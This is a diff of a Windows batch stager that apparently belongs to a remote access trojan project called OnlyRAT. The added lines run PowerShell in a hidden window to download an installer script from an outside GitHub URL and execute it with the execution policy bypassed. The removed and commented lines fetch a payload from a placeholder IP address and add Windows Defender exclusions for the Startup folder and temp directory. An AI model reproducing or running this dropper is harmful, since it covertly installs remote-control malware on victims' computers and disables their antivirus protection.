@@ -1,9 +1,6 @@
 @echo off
 @REM powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
 @REM powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/l.ps1"
-
-set "EcSjRhAguo=X.X.X.X"
-
 @echo off
 
 if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
@@ -28,6 +25,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri %EcSjRhAguo%/mk01-onlyrat/payloads/v2.ps1 -OutFile KFPGaEYdcz.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
-@REM powershell powershell.exe -windowstyle hidden -ep bypass ./KFPGaEYdcz.ps1
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/installer.ps1"
+powershell powershell.exe -windowstyle hidden -ep bypass "installer.ps1"
 @REM del wEaoFkNduy.cmd
